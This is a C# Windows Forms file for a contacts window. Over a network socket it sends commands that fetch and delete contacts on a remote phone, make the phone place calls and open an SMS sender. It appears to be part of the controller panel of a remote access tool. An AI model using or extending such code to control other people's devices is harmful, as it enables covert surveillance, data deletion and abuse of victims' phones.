using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Rehber : Form
    {
        Socket sco; public string ID = "";
        public Rehber(Socket sck, string aydi)
        {
            InitializeComponent();
            ID = aydi; sco = sck;
        }

        private void ekleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Ekle(sco).Show();
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", sco);
                listView1.SelectedItems[0].Remove();
                Text = "Rehber";
            }
            catch (Exception) { }
        }

        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("REHBERIVER", "[VERI][0x09]", sco);
                Text = "Rehber";
            }
            catch (Exception) { }
        }

        private void araToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                try
                {
                    Form1.KomutGonder("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", sco);
                    MessageBox.Show("Arama talimatı gönderildi.", "Arama", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }
                catch (Exception) { }
            }
        }

        private void smsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                new SMS(sco, listView1.SelectedItems[0].SubItems[1].Text).Show();
            }
        }

        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
